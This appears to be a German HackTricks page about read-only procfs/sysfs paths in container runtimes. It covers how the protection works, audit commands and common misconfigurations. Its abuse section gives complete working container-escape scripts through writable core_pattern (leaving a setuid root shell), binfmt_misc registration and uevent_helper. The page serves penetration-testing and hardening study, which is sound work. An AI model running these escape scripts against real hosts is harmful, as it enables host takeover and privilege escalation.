# Schreibgeschützte Systempfade

{{#include ../../../../banners/hacktricks-training.md}}

Schreibgeschützte Systempfade sind ein separater Schutzmechanismus gegenüber maskierten Pfaden. Anstatt einen Pfad vollständig zu verstecken, macht die Runtime ihn sichtbar, montiert ihn jedoch schreibgeschützt. Dies ist üblich für ausgewählte procfs- und sysfs-Standorte, bei denen Lesezugriff akzeptabel oder betrieblich notwendig sein kann, Schreibzugriffe jedoch zu gefährlich wären.

Der Zweck ist einfach: Viele Kernel-Schnittstellen werden wesentlich gefährlicher, wenn sie beschreibbar sind. Ein schreibgeschützter Mount entfernt nicht alle reconnaissance-Werte, verhindert jedoch, dass eine kompromittierte Workload die zugrundeliegenden kernel-nahen Dateien über diesen Pfad modifiziert.

## Funktionsweise

Runtimes kennzeichnen häufig Teile der proc/sys-Ansicht als schreibgeschützt. Abhängig von der Runtime und dem Host kann dies Pfade wie die folgenden umfassen:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die tatsächliche Liste variiert, aber das Modell ist dasselbe: Sichtbarkeit dort erlauben, wo sie benötigt wird, Änderungen standardmäßig verweigern.

## Labor

Untersuche die von Docker deklarierten schreibgeschützten Pfade:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Untersuche die gemountete proc/sys-Ansicht im Container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sicherheitsauswirkung

Read-only system paths schränken eine große Klasse von Missbrauch ein, die den Host beeinflussen. Selbst wenn ein Angreifer procfs oder sysfs einsehen kann, schränkt die Unfähigkeit, dort zu schreiben, viele direkte Modifikationspfade ein, die Kernel-Parameter, Crash-Handler, Helfer zum Laden von Modulen oder andere Steuerungsschnittstellen betreffen. Die Angriffsfläche verschwindet nicht vollständig, aber der Übergang von Informationsoffenlegung zu Einfluss auf den Host wird erschwert.

## Fehlkonfigurationen

Die Hauptfehler sind das Unmaskieren oder Remounten sensibler Pfade als read-write, das direkte Freilegen von Host proc/sys-Inhalten durch beschreibbare bind mounts oder die Verwendung von privileged modes, die die sichereren Runtime-Defaults effektiv umgehen. In Kubernetes treten `procMount: Unmasked` und privileged workloads häufig zusammen mit schwächerem proc-Schutz auf. Ein weiterer häufiger Betriebsfehler ist die Annahme, dass, weil die Runtime diese Pfade normalerweise read-only moun­tet, alle Workloads weiterhin diese Standardeinstellung erben.

## Missbrauch

Wenn der Schutz schwach ist, beginnen Sie damit, nach writable proc/sys-Einträgen zu suchen:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wenn schreibbare Einträge vorhanden sind, gehören folgende besonders wertvolle Folgepfade dazu:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Was diese Befehle offenbaren können:

- Schreibbare Einträge unter `/proc/sys` bedeuten oft, dass der container das Verhalten des host-Kernel ändern kann, statt es nur zu inspizieren.
- `core_pattern` ist besonders wichtig, weil ein schreibbarer host-seitiger Wert in einen host code-execution path verwandelt werden kann, indem man nach dem Setzen eines pipe handlers einen Prozess zum Absturz bringt.
- `modprobe` zeigt den Helper, den der kernel für module-loading-bezogene Abläufe verwendet; es ist ein klassisches High-Value-Ziel, wenn es schreibbar ist.
- `binfmt_misc` sagt, ob die Registrierung benutzerdefinierter Interpreter möglich ist. Wenn die Registrierung schreibbar ist, kann dies zu einem execution primitive werden, anstatt nur ein information leak zu sein.
- `panic_on_oom` steuert eine host-weite kernel-Entscheidung und kann daher Ressourcenerschöpfung in einen host denial of service verwandeln.
- `uevent_helper` ist eines der klarsten Beispiele dafür, dass ein schreibbarer sysfs-Helper-Pfad host-context execution produziert.

Interessante Befunde umfassen schreibbare host-facing proc knobs oder sysfs-Einträge, die normalerweise read-only sein sollten. An diesem Punkt hat sich die Workload von einer eingeschränkten container-Ansicht zu einem bedeutsamen kernel-Einfluss verschoben.

### Vollständiges Beispiel: `core_pattern` Host Escape

Wenn `/proc/sys/kernel/core_pattern` von innen im container schreibbar ist und auf die host kernel-Ansicht zeigt, kann es ausgenutzt werden, um nach einem Absturz eine Payload auszuführen:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Wenn der Pfad tatsächlich den Host-Kernel erreicht, läuft die payload auf dem Host und hinterlässt eine setuid shell.

### Vollständiges Beispiel: `binfmt_misc` Registrierung

Wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist, kann eine benutzerdefinierte Interpreter-Registrierung code execution erzeugen, wenn die passende Datei ausgeführt wird:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Auf einem hostseitig beschreibbaren `binfmt_misc` führt das zur Ausführung von Code im vom Kernel aufgerufenen Interpreter-Pfad.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel einen Helfer im Host-Pfad aufrufen, wenn ein passendes Ereignis ausgelöst wird:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Der Grund, warum das so gefährlich ist, ist, dass der Helper-Pfad aus der Perspektive des Host‑Dateisystems aufgelöst wird und nicht aus einem sicheren, nur im Container existierenden Kontext.

## Überprüfungen

Diese Überprüfungen bestimmen, ob die procfs/sysfs-Exposition dort, wo erwartet, schreibgeschützt ist und ob die Workload weiterhin empfindliche Kernel‑Schnittstellen ändern kann.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Was hier interessant ist:

- Eine normal gehärtete Workload sollte sehr wenige schreibbare /proc/sys-Einträge offenlegen.
- Schreibbare /proc/sys-Pfade sind oft wichtiger als gewöhnlicher Lesezugriff.
- Wenn die Runtime angibt, ein Pfad sei schreibgeschützt, er in der Praxis aber beschreibbar ist, prüfen Sie sorgfältig Mount-Propagation, Bind-Mounts und Privileg-Einstellungen.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker defines a default read-only path list for sensitive proc entries | exposing host proc/sys mounts, `--privileged` |
| Podman | Enabled by default | Podman applies default read-only paths unless explicitly relaxed | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Inherits runtime defaults | Uses the underlying runtime read-only path model unless weakened by Pod settings or host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | Usually relies on OCI/runtime defaults | same as Kubernetes row; direct runtime config changes can weaken the behavior |

Der Kernpunkt ist, dass schreibgeschützte Systempfade in der Regel als Runtime-Standard vorhanden sind, sich aber leicht durch privilegierte Modi oder Host-Bind-Mounts aushebeln lassen.
